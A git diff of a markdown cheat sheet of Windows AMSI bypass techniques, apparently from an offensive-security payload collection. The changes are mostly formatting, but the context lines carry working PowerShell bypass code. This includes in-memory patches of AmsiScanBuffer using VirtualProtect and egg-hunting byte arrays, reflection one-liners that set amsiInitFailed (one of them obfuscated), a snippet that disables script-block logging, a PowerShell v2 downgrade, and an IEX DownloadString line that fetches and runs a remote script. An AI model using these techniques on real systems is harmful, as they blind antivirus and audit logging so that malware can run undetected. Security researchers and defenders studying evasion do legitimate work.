@@ -4,26 +4,27 @@
 
 * [List AMSI Providers](#list-amsi-providers)
 * [Which Endpoint Protection is Using AMSI](#which-endpoint-protection-is-using-amsi)
-* [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse)
-* [Dont use net webclient](#Dont-use-net-webclient)
-* [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch)
-* [Forcing an error](#Forcing-an-error)
-* [Disable Script Logging](#Disable-Script-Logging)
-* [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory)
-* [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64)
-* [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method)
-* [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass)
-* [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method)
-* [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method")
-* [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2)
-* [Nishang all in one](#Nishang-all-in-one)
-* [Adam Chesters Patch](#Adam-Chester-Patch)
+* [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
+* [Dont use net webclient](#dont-use-net-webclient)
+* [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#amsi-scanbuffer-patch)
+* [Forcing an error](#forcing-an-error)
+* [Disable Script Logging](#disable-script-logging)
+* [Amsi Buffer Patch - In memory](#amsi-buffer-patch---in-memory)
+* [Same as 6 but integer Bytes instead of Base64](#same-as-6-but-integer-bytes-instead-of-base64)
+* [Using Matt Graeber's Reflection method](#using-matt-graebers-reflection-method)
+* [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#using-matt-graebers-reflection-method-with-wmf5-autologging-bypass)
+* [Using Matt Graeber's second Reflection method](#using-matt-graebers-second-reflection-method)
+* [Using Cornelis de Plaa's DLL hijack method](#using-cornelis-de-plaas-dll-hijack-method)
+* [Use Powershell Version 2 - No AMSI Support there](#using-powershell-version-2)
+* [Nishang all in one](#nishang-all-in-one)
+* [Adam Chesters Patch](#adam-chester-patch)
 * [AMSI.fail](#amsifail)
 
 ## List AMSI Providers
 
 * List providers with : `Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\'`
 * Find software from CLSID
+
     ```ps1
     Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}'
     Name                           Property
@@ -38,16 +39,15 @@ Small extract from [subat0mik/whoamsi](https://github.com/subat0mik/whoamsi) - A
 
 | Vendor/Product  | AMSI | Date | Reference |
 | -------- | -------- | -------- | -------- |
-| Avast | Y | 03/20/2016 | https://forum.avast.com/index.php?topic=184491.msg1300884#msg1300884 |
-| AVG | Y | 03/08/2016 | https://support.avg.com/answers?id=906b00000008oUTAAY |
-| BitDefender Consumer | Y | 09/20/2016 | https://forum.bitdefender.com/index.php?/topic/72455-antimalware-scan-service/ |
-| BitDefender Enterprise | Y | 05/25/2021 | https://twitter.com/Bitdefender_Ent/status/1397187195669295111?s=20 |
-| Kaspersky Anti Targeted Attack Platform | Y | 10/10/2018 | https://help.kaspersky.com/KIS/2019/en-US/119653.htm |
-| Symantec Advanced Threat Protection | Y | 07/15/2020 | https://techdocs.broadcom.com/content/broadcom/techdocs/us/en/symantec-security-software/endpoint-security-and-management/endpoint-protection/all/release-notes/Whats-new-for-Symantec-Endpoint-Protection-14_3-.html |
-| Microsoft Defender for Endpoint | Y | 06/09/2015 | https://www.microsoft.com/security/blog/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/
+| Avast | Y | 03/20/2016 | <https://forum.avast.com/index.php?topic=184491.msg1300884#msg1300884> |
+| AVG | Y | 03/08/2016 | <https://support.avg.com/answers?id=906b00000008oUTAAY> |
+| BitDefender Consumer | Y | 09/20/2016 | <https://forum.bitdefender.com/index.php?/topic/72455-antimalware-scan-service/> |
+| BitDefender Enterprise | Y | 05/25/2021 | <https://twitter.com/Bitdefender_Ent/status/1397187195669295111?s=20> |
+| Kaspersky Anti Targeted Attack Platform | Y | 10/10/2018 | <https://help.kaspersky.com/KIS/2019/en-US/119653.htm> |
+| Symantec Advanced Threat Protection | Y | 07/15/2020 | <https://techdocs.broadcom.com/content/broadcom/techdocs/us/en/symantec-security-software/endpoint-security-and-management/endpoint-protection/all/release-notes/Whats-new-for-Symantec-Endpoint-Protection-14_3-.html> |
+| Microsoft Defender for Endpoint | Y | 06/09/2015 | <https://www.microsoft.com/security/blog/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/> |
 
-
-# Patching amsi.dll AmsiScanBuffer by rasta-mouse
+## Patching amsi.dll AmsiScanBuffer by rasta-mouse
 
 ```ps1
 $Win32 = @"
@@ -100,9 +100,9 @@ IEX($content)
 IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
 ```
 
-# Amsi ScanBuffer Patch
+## Amsi ScanBuffer Patch
 
-Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass
+Egghunter with blog post: <https://www.contextis.com/us/blog/amsi-bypass>
 
 ```ps1
 Write-Host "-- AMSI Patch"
@@ -154,7 +154,7 @@ Write-Host "[+] AMSI DLL Handle: $hModule"
 Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
 
 If ([IntPtr]::Size -eq 8) {
-	Write-Host "[+] 64-bits process"
+ Write-Host "[+] 64-bits process"
     [byte[]]$egg = [byte[]] (
         0x4C, 0x8B, 0xDC,       # mov     r11,rsp
         0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
@@ -166,7 +166,7 @@ If ([IntPtr]::Size -eq 8) {
         0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
     )
 } Else {
-	Write-Host "[+] 32-bits process"
+ Write-Host "[+] 32-bits process"
     [byte[]]$egg = [byte[]] (
         0x8B, 0xFF,             # mov     edi,edi
         0x55,                   # push    ebp
@@ -192,7 +192,7 @@ $a = 0
 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
 ```
 
-# Forcing an error
+## Forcing an error
 
 ```ps1
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
@@ -200,7 +200,7 @@ $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
 ```
 
-# Disable Script Logging
+## Disable Script Logging
 
 ```ps1
 $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
@@ -212,7 +212,7 @@ $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr
 [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
 ```
 
-# Amsi Buffer Patch - In memory
+## Amsi Buffer Patch - In memory
 
 ```ps1
 function Bypass-AMSI
@@ -224,7 +224,7 @@ function Bypass-AMSI
 }
 ```
 
-# Same as 6 but integer Bytes instead of Base64
+## Same as 6 but integer Bytes instead of Base64
 
 ```ps1
 function MyPatch{
@@ -239,12 +239,13 @@ MyPatch;
 Start-Sleep 1;
 ```
 
-# Using Matt Graebers Reflection method
+## Using Matt Graebers Reflection method
 
 ```ps1
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-# Using Matt Graebers Reflection method with WMF5 autologging bypass
+
+## Using Matt Graebers Reflection method with WMF5 autologging bypass
 
 ```ps1
 [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
@@ -282,16 +283,16 @@ else
 {
         Write-Verbose "Checking if .Net version 2.0.50727 is installed."
         $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
-	if($versions -match "2.0.50727")
-	{
-        	Write-Verbose ".Net version 2.0.50727 found."
-        	Write-Output "Executing the bypass."
-        	powershell.exe -version 2
-	}
-	else
-	{
-        	Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
-	}
+ if($versions -match "2.0.50727")
+ {
+         Write-Verbose ".Net version 2.0.50727 found."
+         Write-Output "Executing the bypass."
+         powershell.exe -version 2
+ }
+ else
+ {
+         Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
+ }
 }
 ```
 
@@ -687,10 +688,9 @@ Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(e
 }
 ```
 
-
 ## Adam Chester Patch
 
-Bypass Update by Adam Chester https://twitter.com/_xpn_/status/1170852932650262530
+Bypass Update by Adam Chester <https://twitter.com/_xpn_/status/1170852932650262530>
 
 ```ps1
 $Winpatch = @"
@@ -762,6 +762,7 @@ Add-Type -TypeDefinition $Winpatch -Language CSharp
 ## Other interesting AMSI bypass
 
 * [tihanyin/PSSW100AVB/AMSI_bypass_2021_09.ps1](https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1)
+
     ```ps1
     $A="5492868772801748688168747280728187173688878280688776828"
     $B="1173680867656877679866880867644817687416876797271"
@@ -770,8 +771,9 @@ Add-Type -TypeDefinition $Winpatch -Language CSharp
 
 ## AMSI.fail
 
-> AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures. - https://amsi.fail/
+> AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.
 
+* [amsi.fail](https://amsi.fail)
 
 ## References
 
